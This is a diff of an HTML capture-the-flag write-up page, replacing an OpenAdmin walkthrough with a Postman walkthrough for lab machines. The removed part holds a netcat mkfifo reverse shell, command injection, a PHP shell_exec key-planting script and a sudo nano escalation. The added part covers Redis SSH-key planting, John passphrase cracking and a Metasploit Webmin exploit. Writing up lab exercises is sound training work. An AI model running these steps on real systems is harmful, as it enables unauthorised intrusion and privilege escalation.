@@ -21,112 +21,106 @@
   }
 </style>
 </head>
-<body><div id="readme" class="container"><article class="markdown-body entry-content"><h1 id="openadmin">OpenAdmin</h1>
-<p><img src="https://lassa97.github.io/imgs/OpenAdmin.png" alt="OpenAdmin"></p>
+<body><div id="readme" class="container"><article class="markdown-body entry-content"><h1 id="postman">Postman</h1>
+<p><img src="https://lassa97.github.io/imgs/Postman.png" alt="Postman"></p>
 <hr>
 <h3 id="nmap">Nmap</h3>
 <p>We start with an <code>nmap</code> scan:</p>
 <blockquote>
-<p>lassault@kakia:~$ nmap -sV -sC -oA OpenAdmin 10.10.10.171</p>
+<p>lassault@kakia:~$ nmap -sV -sC -oA Postman 10.10.10.160</p>
 </blockquote>
-<pre><code># Nmap 7.80 scan initiated Wed Jan  8 18:44:48 2020 as: nmap -sV -sC -oA OpenAdmin 10.10.10.171
-Nmap scan report for 10.10.10.171
-Host is up (0.069s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+<pre><code># Nmap 7.80 scan initiated Wed Feb  5 11:28:24 2019 as: nmap -sC -sV -oA postman 10.10.10.160
+Nmap scan report for 10.10.10.160
+Host is up (0.049s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
-|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
-|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-title: The Cyber Geek&apos;s Personal Website
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-server-header: MiniServ/1.910
+|_http-title: Site doesn&apos;t have a title (text/html; Charset=iso-8859-1).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Jan  8 18:46:21 2020 -- 1 IP address (1 host up) scanned in 92.99 seconds</code></pre><p>We find <code>ssh</code> on port 22 and <code>http</code> on port 80.</p>
+# Nmap done at Wed Feb  5 11:29:14 2019 -- 1 IP address (1 host up) scanned in 50.51 seconds</code></pre><p>We find <code>ssh</code> on port 22, <code>http</code> on port 80 and <code>Webmin</code> on port 10000.</p>
 <hr>
 <h3 id="web-enumeration">Web Enumeration</h3>
 <p>We use <code>gobuster</code> to find some useful directories that we can exploit:</p>
 <blockquote>
-<p>lassault@kakia:~$ gobuster dir -u <a href="http://10.10.10.171">http://10.10.10.171</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o OpenAdmin.dir</p>
+<p>lassault@kakia:~$ gobuster dir -u <a href="http://10.10.10.160">http://10.10.10.160</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o Postman.dir</p>
 </blockquote>
 <pre><code>===============================================================
-[+] Url:            http://10.10.10.171
+[+] Url:            http://10.10.10.160
 [+] Threads:        10
 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 [+] Status codes:   200,204,301,302,307,401,403
 [+] User Agent:     gobuster/3.0.1
 [+] Timeout:        10s
 ===============================================================
-2020/01/08 17:53:21 Starting gobuster
+2020/02/05 11:34:51 Starting gobuster
 ===============================================================
-/music (Status: 301)
-/artwork (Status: 301)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/js (Status: 301)
+/server-status (Status: 403)
+/upload (Status: 301)
 ===============================================================
-2020/01/08 18:51:04 Finished
-===============================================================</code></pre><p>Going to <a href="http://10.10.10.171/music/">http://10.10.10.171/music/</a> shows a login button. We click it and we are redirected to <a href="http://10.10.10.171/ona/">this</a>. It is the OpenNetAdmin Tool running the 18.1.1 version.</p>
-<hr>
-<h3 id="command-injection">Command Injection</h3>
-<p>Doing some research, we find there is a Remote Code Execution vulnerability (OpenNetAdmin 18.1.1 - Command Injection Exploit).</p>
-<p>We take the <a href="https://packetstormsecurity.com/files/155406/opennetadmin1811-exec.txt">source code</a> and we create a reverse shell. First, we open a local port and then we write this command as input of the exploit.</p>
+2020/01/08 11:53:18 Finished
+===============================================================</code></pre><p>We explore the webpage, but we don&apos;t find any way to gain access to the server. Because of that, we decide to rerun <code>nmap</code> using a full scan:</p>
 <blockquote>
-<p>lassault@kakia:~$ nc -lvnp 51111</p>
-<p>lassault@kakia:~$ ./exploit.sh <a href="http://10.10.10.171/ona/">http://10.10.10.171/ona/</a></p>
-<p>lassault@kakia:~$ mkfifo /tmp/flipper; nc 10.10.15.182 51111 &lt; /tmp/flipper | /bin/sh &gt; /tmp/flipper; rm /tmp/flipper;</p>
+<p>lassault@kakia:~$ nmap -p- -oA Postman 10.10.10.160</p>
+</blockquote>
+<pre><code># Nmap 7.80 scan initiated Wed Feb  5 12:03:12 2019 as: nmap -sC -sV -oA postman 10.10.10.160
+Nmap scan report for 10.10.10.160
+Host is up (0.049s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek&apos;s Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-server-header: MiniServ/1.910
+|_http-title: Site doesn&apos;t have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Feb  5 12:04:26 2019 -- 1 IP address (1 host up) scanned in 74.32 seconds</code></pre><p>We find <code>Redis</code> on port 6379. Doing some research, we find there is a Remote Command Execution vulnerability (<a href="http://antirez.com/news/96">http://antirez.com/news/96</a>)</p>
+<p>We follow the previous source to add our own <code>ssh</code> key to the <code>authorized_keys</code> of the user <code>redis</code>. Now, we are able to login as <code>redis</code>.</p>
+<blockquote>
+<p>lassault@kakia:~$ ssh <a href="mailto:redis@10.10.10.160">redis@10.10.10.160</a></p>
 </blockquote>
 <hr>
-<h3 id="jimmy">Jimmy</h3>
-<p>After some enumeration, we find some creds (<strong>jimmy:n1nj4w4rri0R!</strong>) in <em>/opt/ona/www/local/config/database_settings.inc.php</em>
-Also, we find two users (<strong>jimmy</strong> and <strong>joanna</strong>) and a common group (<strong>internal</strong>).
-Now, we connect via <code>ssh</code> using the creds of <strong>jimmy</strong>:</p>
+<h3 id="redis">Redis</h3>
+<p>Once we are logged, we do some enumeration and we find an <code>ssh</code> key in <em>/opt/id_rsa.key</em> with a passphrase. We bruteforce using <strong>ssh2john.py</strong> and <strong>John The Ripper</strong>.</p>
 <blockquote>
-<p>lassault@kakia:~$ ssh <a href="mailto:jimmy@10.10.10.171">jimmy@10.10.10.171</a></p>
+<p>lassault@kakia:~$ ssh2john.py Matt.key &gt; Matt.John</p>
+<p>lassault@kakia:~$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH Matt.John</p>
 </blockquote>
-<hr>
-<h3 id="joanna">Joanna</h3>
-<p>Once we are logged, we find three local ports open.</p>
-<blockquote>
-<p>jimmy@openadmin:~$ netstat -nputa</p>
-</blockquote>
-<pre><code>Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
-tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -</code></pre><p>We have the port 53 (<em>DNS</em>), the port 3306 (<em>MySQL</em>) and the port 52846. Then, we find under <em>/var/www</em> directory a folder called <strong>internal</strong>. The user <strong>jimmy</strong> is the owner and the group <strong>internal</strong> has all the permissions in that directory. Inside it, we find the source code of the <em>PHP</em>s that are served in the port 52846.
-1) <strong>index.php</strong>: Has a login form with the SHA512 of another pass of <strong>jimmy</strong>.
-2) <strong>main.php</strong>: Displays the private key of <strong>joanna</strong> using <em>shell_exec()</em>.
-3) <strong>logout.php</strong>: A simple logout.</p>
-<p>We decide to create a <code>ssh</code> tunnel to display it in our browser:</p>
-<blockquote>
-<p>lassault@kakia:~$ ssh <a href="mailto:jimmy@10.10.10.171">jimmy@10.10.10.171</a> -L 55555:127.0.0.1:52846</p>
-</blockquote>
-<p>And going to <a href="http://127.0.0.1:55555">http://127.0.0.1:55555</a>, we see the login form. Because we have all the permissions in the <strong>internal</strong> directory, we&apos;ve decide to create our own PHP that adds a public key to the <em>authorized_keys</em> of <strong>joanna</strong> using the <em>shell_exec()</em> function to execute commands.</p>
-<p><strong>flipper.php</strong></p>
-<pre><code class="language-php">&lt;?php
-    shell_exec(&quot;cat /var/www/internal/fake.txt &gt;&gt; /home/joanna/.ssh/authorized_keys&quot;);
-    $keys = shell_exec(&quot;cat /home/joanna/.ssh/authorized_keys&quot;);
-    echo &quot;&lt;pre&gt;&quot; . $keys . &quot;&lt;/pre&gt;&quot;;
- ?&gt;</code></pre>
-<p>Then, we generate a new <code>ssh</code> key using <code>ssh-keygen</code> and we paste the public key inside <em>fake.txt</em>. We change the group own of <em>flipper.php</em> to <strong>internal</strong> using <code>chgrp</code>. After that, we go to <a href="http://127.0.0.1:55555/flipper.php">http://127.0.0.1:55555/flipper.php</a> and we can see that we have added our public key to the <em>authorized_keys</em> of <strong>joanna</strong>.</p>
-<p>Finally, we login with <code>ssh</code> using our private key and we have the user flag.</p>
-<blockquote>
-<p>lassault@kakia:~$ ssh <a href="mailto:joanna@10.10.10.171">joanna@10.10.10.171</a> -i OpenAdmin.key</p>
-<p>joanna@openadmin:~$ cat /home/joanna/user.txt</p>
-</blockquote>
-<p><code>HTB{c9b2cf07d40807e62af62660f0c81b5f}</code></p>
-<hr>
+<p>We obtain this creds <em>Matt:computer2008</em>. We can&apos;t login via <code>ssh</code>, but we can log to the <code>Webmin</code> panel with that creds.</p>
 <h3 id="root">Root</h3>
-<p>We are going to use <a href="https://gtfobins.github.io/">GTFOBins</a> to gain privilegies. We find that <strong>joanna</strong> can edit the file <em>/opt/priv</em> owned by <strong>root</strong> without password.</p>
+<p>We use the Webmin Package Updates Remote Command Execution vulnerability (CVE-2019-12840) to obtain <em>root</em> access. We can use the Metasploit module of Webmin 1.910 (exploit/linux/http/webmin_packageup_rce) to obtain a reverse shell. We should put the SSL option to true, because the Webmin panel is in <a href="https://10.10.10.160:10000">https://10.10.10.160:10000</a>
+With the <em>root</em> shell, we can see the user flag and the root flag.</p>
 <blockquote>
-<p>joanna@openadmin:~$ sudo -l</p>
+<p>root@postman:~# cat /home/Matt/user.txt</p>
 </blockquote>
-<p><code>sudo /bin/nano /opt/priv</code></p>
-<p>Following the instructions for <code>nano</code>, we have our root shell and we can own the root flag.</p>
+<p><code>HTB{517ad0ec2458ca97af8d93aac08a2f3c}</code></p>
 <blockquote>
-<p>root@openadmin:~# cat /root/root.txt</p>
+<p>root@postman:~# cat root/root.txt</p>
 </blockquote>
-<p><code>HTB{2f907ed450b361b2c2bf4e8795d5b561}</code></p>
+<p><code>HTB{a257741c5bed8be7778c6ed95686ddce}</code></p>
 </article></div><div style="background-color: #b4b2b2;width: 50px;height:50px;line-height: 50px;text-align: center;position: fixed;bottom: 10px;right: 10px;padding-top:5px;" onclick="document.documentElement.scrollTop = document.body.scrollTop =0;">
   <svg t="1533629773982" class="icon" style="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1035" xlink="http://www.w3.org/1999/xlink" width="40" height="40"><defs><style type="text/css">@font-face { font-family: uc-nexus-iconfont; src: url("chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.woff") format("woff"), url("chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.ttf") format("truetype"); }
   </style></defs><path d="M536.255427 195.182354c-7.804756-7.804756-17.966187-11.615549-28.311813-11.615549-9.43693 0-18.874883 3.449565-26.496467 10.163477-2.360767 1.452071-4.356214 3.267417-6.352685 5.262864L218.47792 455.611735c-15.607466 15.60542-15.607466 40.834011 0 56.43943 15.607466 15.607466 41.558511 15.607466 57.167001 0l193.46013-192.733583 0 600.526219c0 22.1423 17.787108 39.927361 39.927361 39.927361 22.140253 0 39.927361-17.785062 39.927361-39.927361L548.959773 319.317583 737.15704 508.422522c15.607466 15.607466 40.469714 15.607466 56.078203 0 15.607466-15.607466 15.425318-40.834011-0.182149-56.441477L536.255427 195.182354 536.255427 195.182354z" p-id="1036" fill="#333"/><path d="M101.784174 143.097092l816.674071 0c22.140253 0 39.925315-17.785062 39.925315-39.927361 0-22.140253-17.784038-39.925315-39.925315-39.925315L101.784174 63.244416c-22.140253 0-39.927361 17.785062-39.927361 39.925315C61.856813 125.31203 79.643921 143.097092 101.784174 143.097092L101.784174 143.097092z" p-id="1037" fill="#333"/></svg>
